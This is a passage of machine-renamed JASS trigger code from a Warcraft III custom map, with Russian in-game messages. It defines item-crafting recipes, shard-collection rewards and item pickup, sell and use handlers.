call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49305046) then
if nO(QF,$4930514F) then
call RemoveItem(nP(QF,$49305046))
call RemoveItem(nP(QF,$4930514F))
set NF=false
call nQ($49305231,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304931) then
if nO(QF,$4930514F) then
call RemoveItem(nP(QF,$49304931))
call RemoveItem(nP(QF,$4930514F))
set NF=false
call nQ($49305230,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49305048) then
if nO(QF,$4930514F) then
call RemoveItem(nP(QF,$49305048))
call RemoveItem(nP(QF,$4930514F))
set NF=false
call nQ($4930515A,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304941) then
if nO(QF,$4930514F) then
call RemoveItem(nP(QF,$49304941))
call RemoveItem(nP(QF,$4930514F))
set NF=false
call nQ($49305159,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304F5A) then
if nO(QF,$4930514F) then
call RemoveItem(nP(QF,$49304F5A))
call RemoveItem(nP(QF,$4930514F))
set NF=false
call nQ($49305158,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304942) then
if nO(QF,$4930514F) then
call RemoveItem(nP(QF,$49304942))
call RemoveItem(nP(QF,$4930514F))
set NF=false
call nQ($49305157,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304943) then
if nO(QF,$4930514F) then
call RemoveItem(nP(QF,$49304943))
call RemoveItem(nP(QF,$4930514F))
set NF=false
call nQ($49305156,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49305031) then
if nO(QF,$4930514F) then
call RemoveItem(nP(QF,$49305031))
call RemoveItem(nP(QF,$4930514F))
set NF=false
call nQ($49305155,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304951) then
if nO(QF,$4930514F) then
call RemoveItem(nP(QF,$49304951))
call RemoveItem(nP(QF,$4930514F))
set NF=false
call nQ($49305154,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$4930494D) then
if nO(QF,$4930514F) then
call RemoveItem(nP(QF,$4930494D))
call RemoveItem(nP(QF,$4930514F))
set NF=false
call nQ($49305153,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$4930494F) then
if nO(QF,$4930514F) then
call RemoveItem(nP(QF,$4930494F))
call RemoveItem(nP(QF,$4930514F))
set NF=false
call nQ($49305152,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304551) then
if nO(QF,$4930544A) then
call RemoveItem(nP(QF,$49304551))
call RemoveItem(nP(QF,$4930544A))
set NF=false
call nQ($4930544E,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304552) then
if nO(QF,$4930544A) then
call RemoveItem(nP(QF,$49304552))
call RemoveItem(nP(QF,$4930544A))
set NF=false
call nQ($4930544C,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304553) then
if nO(QF,$4930544A) then
call RemoveItem(nP(QF,$49304553))
call RemoveItem(nP(QF,$4930544A))
set NF=false
call nQ($4930544D,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304553) then
if nO(QF,$4930544A) then
call RemoveItem(nP(QF,$49304553))
call RemoveItem(nP(QF,$4930544A))
set NF=false
call nQ($4930544D,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49304550) then
if nO(QF,$4930544A) then
call RemoveItem(nP(QF,$49304550))
call RemoveItem(nP(QF,$4930544A))
set NF=false
call nQ($4930544B,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49303456) then
if nO(QF,$49304258) then
call RemoveItem(nP(QF,$49303456))
call RemoveItem(nP(QF,$49304258))
set NF=false
call nQ($4930564A,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
if nO(QF,$49303456) then
if nO(QF,$4930425A) then
call RemoveItem(nP(QF,$49303456))
call RemoveItem(nP(QF,$4930425A))
set NF=false
call nQ($4930564B,QF)
set NF=true
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",QF,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",QF,"chest"))
endif
endif
endif
set hS=null
set QF=null
endfunction
function Bvh takes nothing returns nothing
local trigger hR=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(hR,EVENT_PLAYER_UNIT_SELL_ITEM)
call TriggerAddAction(hR,function Bvg)
set hR=null
endfunction
function Bvi takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49303356) then
return false
endif
return true
endfunction
function Bvj takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49304131) then
return false
endif
return true
endfunction
function Bvk takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49303753) then
return false
endif
return true
endfunction
function Bvl takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49303357) then
return false
endif
return true
endfunction
function Bvm takes nothing returns boolean
if not (Tn==90) then
return false
endif
return true
endfunction
function Bvn takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930514E) then
return false
endif
return true
endfunction
function Bvo takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bvp takes nothing returns nothing
call SetUnitManaBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_MANA,GetEnumUnit())+GetUnitStateSwap(UNIT_STATE_MAX_MANA,GetEnumUnit())/5.)
endfunction
function Bvq takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930354B) then
return false
endif
return true
endfunction
function Bvr takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bvs takes nothing returns nothing
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())+GetUnitStateSwap(UNIT_STATE_MAX_LIFE,GetEnumUnit())/5.)
endfunction
function Bvt takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930354A) then
return false
endif
return true
endfunction
function Bvu takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49304A30) then
return false
endif
return true
endfunction
function Bvv takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930495A) then
return false
endif
return true
endfunction
function Bvw takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49304959) then
return false
endif
return true
endfunction
function Bvx takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49304A31) then
return false
endif
return true
endfunction
function Bvy takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49304839) then
return false
endif
return true
endfunction
function Bvz takes nothing returns nothing
if Bvl() then
call SelectUnitForPlayerSingle(VR[5],GetTriggerPlayer())
else
if Bvk() then
call SelectUnitForPlayerSingle(VR[6],GetTriggerPlayer())
else
if Bvj() then
call SelectUnitForPlayerSingle(VR[7],GetTriggerPlayer())
else
if Bvi() then
call SelectUnitForPlayerSingle(VR[4],GetTriggerPlayer())
else
endif
endif
endif
endif
if Bvn() then
set Tn=Tn+3
call DisplayTextToForce(GetPlayersAll(),"Осколки |c00969696Обсидиана: |r"+(I2S(Tn/3)+"/|c0000ff0030|r"+". |c00ff9696Награду получит лишь тот, кто возьмет последний осколок!"))
if Bvm() then
call DisplayTextToForce(GetPlayersAll(),"|c0000ffffУДАЧА!!! Все осколки Обсидиана собраны! Получите награду.")
call UnitAddItemByIdSwapped($4930514F,GetTriggerUnit())
call SetItemUserData(GetLastCreatedItem(),GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit())))
else
endif
else
endif
if Bvq() then
set Vz=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(800.,Vz,Condition(function Bvo))
call ForGroupBJ(SR,function Bvp)
call RemoveLocation(Vz)
call DestroyGroup(SR)
else
endif
if Bvt() then
set Vz=GetUnitLoc(GetTriggerUnit())
set SR=GetUnitsInRangeOfLocMatching(800.,Vz,Condition(function Bvr))
call ForGroupBJ(SR,function Bvs)
call RemoveLocation(Vz)
call DestroyGroup(SR)
else
endif
if Bvu() then
set NK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+75
else
endif
if Bvv() then
set NK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+45
else
endif
if Bvw() then
set NK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+24
else
endif
if Bvx() then
set NK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+105
else
endif
if Bvy() then
set NK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=NK[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+15
else
endif
endfunction
function Bv0 takes nothing returns nothing
set hT=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(hT,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(hT,function Bvz)
endfunction
function Bv1 takes nothing returns boolean
if not (GetIssuedOrderIdBJ()==String2OrderIdBJ("smart")) then
return false
endif
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
if not (GetItemUserData(GetOrderTargetItem())>=0) then
return false
endif
return true
endfunction
function Bv2 takes nothing returns boolean
if not (GetUnitAbilityLevel(GetTriggerUnit(),$41304B54)>=1) then
return false
endif
return true
endfunction
function Bv3 takes nothing returns boolean
if not (Sv[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]>=6) then
return false
endif
return true
endfunction
function Bv4 takes nothing returns boolean
if not (UnitHasItem(GetTriggerUnit(),UnitItemInSlotBJ(GetTriggerUnit(),GetForLoopIndexB()))==true) then
return false
endif
return true
endfunction
function Bv5 takes nothing returns nothing
set Sv[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=0
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if Bv4() then
set Sv[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=Sv[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]+1
if Bv3() then
if Bv2() then
call IssueTargetItemOrder(NL[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))*2],"smart",GetOrderTargetItem())
else
endif
else
endif
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function Bv6 takes nothing returns nothing
set hU=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(hU,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(hU,Condition(function Bv1))
call TriggerAddAction(hU,function Bv5)
endfunction
function Bv7 takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49305130) then
return false
endif
return true
endfunction
function Bv8 takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49305059) then
return false
endif
return true
endfunction
function Bv9 takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$49305131) then
return false
endif
return true
endfunction
function BwB takes nothing returns boolean
if not (GetItemTypeId(GetManipulatedItem())==$4930505A) then
return false
endif
return true
endfunction
function BwC takes nothing returns nothing
if Bv7() then
set NF=false
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49305130))
call UnitAddItemByIdSwapped($4930505A,GetTriggerUnit())
set NF=true
else
endif
if Bv8() then
set NF=false
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49305059))
call UnitAddItemByIdSwapped($49305130,GetTriggerUnit())
set NF=true
else
endif
if Bv9() then
set NF=false
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$49305131))
call UnitAddItemByIdSwapped($49305059,GetTriggerUnit())
set NF=true
else
endif
if BwB() then
set NF=false
call RemoveItem(GetItemOfTypeFromUnitBJ(GetTriggerUnit(),$4930505A))
call UnitAddItemByIdSwapped($49305131,GetTriggerUnit())
set NF=true
else
endif
endfunction
function BwD takes nothing returns nothing
set hV=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(hV,EVENT_PLAYER_UNIT_USE_ITEM)
call TriggerAddAction(hV,function BwC)
endfunction
function BwE takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local item Mc
local integer No
local integer Np
local integer Nt
if GetSpellAbilityId()==$41303831 then
set Mc=GetSpellTargetItem()
set No=GetItemTypeId(Mc)
set Np=1
loop
set Nt=1
loop
if QB[Np*6+Nt]==0 then
set Nt=6
elseif QB[Np*6+Nt]==No then
call DisplayTimedTextToPlayer(GetOwningPlayer(Hu),0.,0.,30.,"|cffff0000"+GetObjectName(P9[Np])+"|r = "+QD[Np])
set Nt=6
endif
exitwhen Nt==6
set Nt=Nt+1
endloop
exitwhen Np==P8
set Np=Np+1
endloop
set Mc=null
endif
set Hu=null
endfunction
function BwF takes unit Hu,integer Of,integer P2,integer P3,integer P4,integer P5,integer P6,integer P7 returns nothing
local item MO
call RemoveItem(nP(Hu,P2))
call RemoveItem(nP(Hu,P3))
call RemoveItem(nP(Hu,P4))
call RemoveItem(nP(Hu,P5))
call RemoveItem(nP(Hu,P6))
call RemoveItem(nP(Hu,P7))
set MO=nQ(Of,Hu)
call SetItemUserData(MO,GetPlayerId(GetOwningPlayer(Hu))+1)
set MO=null
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",Hu,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",Hu,"chest"))
call ne(Hu,GetObjectName(Of)+" собран!",.032,255,255,255)
endfunction
function BwG takes integer Of,integer P2,integer P3,integer P4,integer P5,integer P6,integer P7 returns nothing
local string QC=""
local integer L9=1
set P8=P8+1
set P9[P8]=Of
set QB[P8*6+1]=P2
set QB[P8*6+2]=P3
set QB[P8*6+3]=P4
set QB[P8*6+4]=P5
set QB[P8*6+5]=P6
set QB[P8*6+6]=P7
loop
if QB[P8*6+L9]>0 then
set QC=QC+GetObjectName(QB[P8*6+L9])+" "
endif
exitwhen L9==6
set L9=L9+1
endloop
set QD[P8]=QC
endfunction
function BwH takes unit Hu,integer Of,integer P2,integer P3,integer P4,integer P5,integer P6,integer P7 returns nothing
if nO(Hu,P2) then
if nO(Hu,P3) then
if P4!=0 then
if nO(Hu,P4) then
if P5!=0 then
if nO(Hu,P5) then
if P6!=0 then
if nO(Hu,P6) then
if P7!=0 then
if nO(Hu,P7) then
call BwF(Hu,Of,P2,P3,P4,P5,P6,P7)
endif
else
call BwF(Hu,Of,P2,P3,P4,P5,P6,0)
endif
endif
else
call BwF(Hu,Of,P2,P3,P4,P5,0,0)
endif
endif
else
call BwF(Hu,Of,P2,P3,P4,0,0,0)
endif
endif
else
call BwF(Hu,Of,P2,P3,0,0,0,0)
endif
endif
endif
endfunction
function BwI takes nothing returns nothing
local unit QF=GetTriggerUnit()
local item MO=GetManipulatedItem()
local integer Ma=GetItemTypeId(MO)
local integer L9=1
local integer PC
if GetItemUserData(MO)==0 or GetItemUserData(MO)==GetPlayerId(GetOwningPlayer(QF))+1 then
loop
set PC=1
loop
if QB[L9*6+PC]==0 then
set PC=6
elseif QB[L9*6+PC]==Ma then
call BwH(QF,P9[L9],QB[L9*6+1],QB[L9*6+2],QB[L9*6+3],QB[L9*6+4],QB[L9*6+5],QB[L9*6+6])
set PC=6
endif
exitwhen PC==6
set PC=PC+1
endloop
exitwhen L9==P8
set L9=L9+1
endloop
endif
call BwH(QF,$49305247,$77696C64,$73656872,$7370726E,0,0,0)
call BwH(QF,$49303049,$49303647,$49303359,$49303551,$4930354D,$49303552,0)
call BwH(QF,$49304737,$636E6F62,$72687468,$72617439,$49303358,0,0)
call BwH(QF,$49305248,$6B70696E,$616A656E,$77637963,0,0,0)
call BwH(QF,$49304738,$49303732,$49303348,$49303144,0,0,0)
call BwH(QF,$49303150,$49304545,$49305235,$49304939,$49304850,0,0)
call BwH(QF,$74666172,$4930534E,$61727368,$49304930,0,0,0)
call BwH(QF,$7462736D,$62747374,$4930454F,0,0,0,0)
call BwH(QF,$746C756D,$7462736D,$49303452,0,0,0,0)
call BwH(QF,$75666C67,$49304F4B,$72617433,$49303848,0,0,0)
call BwH(QF,$6E666C67,$75666C67,$49304738,0,0,0,0)
call BwH(QF,$6F666C67,$6E666C67,$49305234,0,0,0,0)
call BwH(QF,$656E6773,$49303346,$49305056,$49305055,0,0,0)
call BwH(QF,$62747374,$49305731,$4930424C,$4930424B,$4930424A,0,0)
set QF=null
set MO=null
endfunction
function BwJ takes nothing returns nothing
call BwG($49304353,$49304431,$726C6966,$49304230,$4930424D,$49303550,$49303554)
call BwG($49304355,$49304432,$726C6966,$49304157,$4930424D,$49303550,$49303554)
call BwG($49304359,$49304444,$726C6966,$49304158,$4930424D,$49303550,$49303554)
call BwG($49304430,$49304435,$726C6966,$4930415A,$4930424D,$49303550,$49303554)
call BwG($4930435A,$49304434,$726C6966,$49304159,$4930424D,$49303550,$49303554)
call BwG($49304356,$49304433,$726C6966,$49304231,$4930424D,$49303550,$49303554)
call BwG($49304357,$49304443,$726C6966,$49304231,$4930424D,$49303550,$49303554)
call BwG($49304354,$49304436,$726C6966,$49304158,$4930424D,$49303550,$49303554)
call BwG($49304446,$49304445,$686C7374,$49304358,$49304252,$70727674,$49303631)
call BwG($49304448,$49304447,$686C7374,$49304353,$49304252,$6576746C,$49303631)
call BwG($49313039,$6B74726D,$4930324E,0,0,0,0)
call BwG($4930444A,$49304449,$686C7374,$49304355,$49304252,$62737064,$49303631)
call BwG($4930444C,$4930444B,$686C7374,$49304359,$49304252,$6C676468,$49303631)
call BwG($4930444E,$4930444D,$686C7374,$49304430,$49304252,$6F646566,$49303631)
call BwG($49304450,$4930444F,$686C7374,$4930435A,$49304252,$62737064,$49303631)
call BwG($49304454,$49304453,$686C7374,$49304356,$49304252,$6576746C,$49303631)
call BwG($49304452,$49304451,$686C7374,$49304354,$49304252,$6C676468,$49303631)
call BwG($49304456,$49304455,$686C7374,$49304357,$49304252,$72616731,$49303631)
call BwG($49304458,$49304457,$6C656467,$49304446,$49304254,$49304237,$49303638)
call BwG($4930445A,$49304459,$6C656467,$49304448,$49304254,$49304237,$49303638)
call BwG($49304531,$49304530,$6C656467,$4930444A,$49304254,$49304235,$49303638)
call BwG($49304533,$49304532,$6C656467,$4930444C,$49304254,$49304236,$49303638)
call BwG($49304535,$49304534,$6C656467,$4930444E,$49304254,$49304232,$49303638)
call BwG($49304537,$49304536,$6C656467,$49304450,$49304254,$49304232,$49303638)
call BwG($49304542,$49304541,$6C656467,$49304454,$49304254,$49304234,$49303638)
call BwG($49304539,$49304538,$6C656467,$49304452,$49304254,$49304236,$49303638)
call BwG($49304544,$49304543,$6C656467,$49304456,$49304254,$49304233,$49303638)
call BwG($4930434D,$49304351,$49304342,$4930434B,$49304352,$49304345,$49303942)
call BwG($49304550,$4930434E,$49304547,$4930454F,0,0,0)
call BwG($49304551,$4930434D,$49304545,$4930454F,0,0,0)
call BwG($49304552,$4930434C,$49304546,$4930454F,0,0,0)
call BwG($49304553,$49304439,$49304546,$4930454F,0,0,0)
call BwG($49304633,$49304458,$49304555,$67666F72,$49304258,$49303352,$49304248)
call BwG($49304634,$4930445A,$49304556,$67666F72,$49304258,$49303352,$49304246)
call BwG($49304635,$49304531,$49304557,$67666F72,$49304258,$49303352,$49304246)
call BwG($49304636,$49304533,$49304632,$74647832,$49304247,$49304258,$49303354)
call BwG($49304637,$49304535,$49304558,$74706F77,$49304245,$49304258,$49303353)
call BwG($49304638,$49304537,$49304559,$74706F77,$49304244,$49304258,$49303353)
call BwG($49304641,$49304542,$4930455A,$67666F72,$49304246,$49304258,$49303352)
call BwG($49304639,$49304539,$49304631,$74647832,$49304249,$49304258,$49303354)
call BwG($49304642,$49304544,$49304630,$74647832,$49304247,$49304258,$49303354)
call BwG($4930464C,$49304633,$49304643,$49304241,$4930424A,$4930425A,$49303545)
call BwG($4930464D,$49304634,$49304644,$49304241,$4930424A,$4930425A,$49303543)
call BwG($4930464E,$49304635,$49304645,$49304241,$4930424A,$4930425A,$49303543)
call BwG($4930464F,$49304636,$49304646,$49304243,$4930424C,$4930425A,$49303544)
call BwG($49304650,$49304637,$49304647,$49304242,$4930424B,$4930425A,$49303542)
call BwG($49304651,$49304638,$49304648,$49304242,$4930424B,$4930425A,$49303542)
call BwG($49304653,$49304641,$4930464A,$49304241,$4930424A,$4930425A,$49303546)
call BwG($49304652,$49304639,$49304649,$49304243,$4930424C,$49303544,$4930425A)
call BwG($49304654,$49304642,$4930464B,$49304243,$4930424C,$49303544,$4930425A)
call BwG($49304741,$4930464C,$49304659,$49305344,$49304545,$49304333,$49305350)
call BwG($49304742,$4930464D,$4930465A,$49305344,$49304547,$49304333,$49305350)
call BwG($49304743,$4930464E,$49304730,$49305344,$49304547,$49304333,$49305350)
call BwG($49304744,$4930464F,$49304731,$49304546,$49305344,$49304333,$49305352)
call BwG($49304745,$49304650,$49304732,$49304546,$49305344,$49304333,$49305351)
call BwG($49304746,$49304651,$49304733,$49304546,$49305344,$49304333,$49305351)
call BwG($49304748,$49304653,$49304735,$49305344,$49304545,$49304333,$49305350)
call BwG($49304747,$49304652,$49304734,$49305344,$49304545,$49304333,$49305352)
call BwG($49304749,$49304654,$49304736,$49305344,$49304545,$49304333,$49305352)
call BwG($49304655,$49303935,$49304143,$49304344,0,0,0)
call BwG($49304758,$49304754,$49304757,$49304755,$49304759,$49304756,0)
call BwG($49304830,$4930475A,$4930474B,$49304758,$4930474F,0,0)
call BwG($49305555,$49305556,$49305355,$4930554F,$4930464D,0,0)
call BwG($49305558,$49305557,$4930554F,$49305355,$4930464C,0,0)
call BwG($4930555A,$49305559,$4930554F,$49305357,$4930464E,0,0)
call BwG($49305631,$49305630,$49305359,$49305551,$49304651,0,0)
call BwG($49305635,$49305634,$49305553,$49305430,$49304654,0,0)
call BwG($49305637,$49305636,$49305553,$49305432,$49304652,0,0)
call BwG($49304933,$49304934,$49304957,$49305043,$49305042,$4930424B,0)
call BwG($49304931,$49304932,$49305043,$4930384A,$49305042,$4930424A,0)
call BwG($49304A4F,$49304936,$49304939,$49304943,$49304C36,$49305235,0)
call BwG($49305033,$49305034,$49304F5A,$49304939,$49304C36,$49305235,0)
call BwG($49304937,$49304938,$49304939,$49304942,$49304C36,$49305235,0)
call BwG($4931304C,$4931304B,$49304939,$49313049,$49304C36,$49305235,0)
call BwG($49305035,$49305036,$49304939,$49305031,$49304C36,$49305235,0)
call BwG($49304943,$49304944,$49304852,$49304831,0,0,0)
call BwG($49304F5A,$49305030,$49304852,$49304831,0,0,0)
call BwG($49304942,$49304945,$49304855,$49304831,0,0,0)
call BwG($49304941,$49304946,$49304851,$49304831,0,0,0)
call BwG($49305031,$49305032,$49304851,$49304831,0,0,0)
call BwG($49313049,$4931304A,$49304851,$49304831,0,0,0)
call BwG($49304947,$4930494A,$49304241,$49304758,0,0,0)
call BwG($49304948,$4930494B,$49304242,$49304758,0,0,0)
call BwG($49304949,$4930494C,$49304243,$49304758,0,0,0)
call BwG($4930494D,$4930494E,$49304947,$4930485A,$49305238,$49305042,$49305043)
call BwG($4930494F,$49304950,$49304948,$4930485A,$49305238,$49305042,$49305043)
call BwG($49304951,$49304952,$49304949,$4930485A,$49305238,$49305042,$49305043)
call BwG($49305243,$49305244,$4930494D,$49305239,$4930424A,$49304657,0)
call BwG($49305241,$49305242,$4930494F,$49305239,$4930424B,$49304658,0)
call BwG($49305245,$49305246,$49304951,$49305239,$4930424C,$49304656,0)
call BwG($49304A52,$49303731,$49303732,$49303748,$49303934,$4930395A,$74726574)
call BwG($49304B4E,$49304B4C,$49303844,$49303846,$49303849,$49303848,0)
call BwG($49304B4F,$49304B4B,$4930384B,$4930384D,$4930384C,$49303935,0)
call BwG($49304B50,$49304B4D,$49304B48,$49304B4A,$49304B49,0,0)
call BwG($49304B53,$49304B51,$49304B4E,$49304B4F,$49304B50,$49304550,$49304B56)
call BwG($49304B52,$49304B51,$49304B4E,$49304B4F,$49304B50,$49304551,$49304B56)
call BwG($49304B54,$49304B51,$49304B4E,$49304B4F,$49304B50,$49304552,$49304B56)
call BwG($49304B55,$49304B51,$49304B4E,$49304B4F,$49304B50,$49304553,$49304B56)
call BwG($49304C41,$49304C38,$49304A4F,$49304C33,$49304C32,$49304C36,$49305234)
call BwG($49305037,$49305038,$49305033,$49304C33,$49304C32,$49304C36,$49305234)
call BwG($49304C42,$49304C39,$49304937,$49304C35,$49304C32,$49304C36,$49305234)
call BwG($49304C37,$49304C43,$49304B46,$49304C34,$49304C32,$49304C36,$49305234)
call BwG($4931304D,$4931304E,$4931304C,$49304C34,$49304C32,$49304C36,$49305234)
call BwG($49305039,$49305041,$49305035,$49304C34,$49304C32,$49304C36,$49305234)
call BwG($49304B46,$49304B47,$49304939,$49304941,$49304C36,$49305235,0)
call BwG($49304D38,$49304D35,$49304D37,$49304D36,0,0,0)
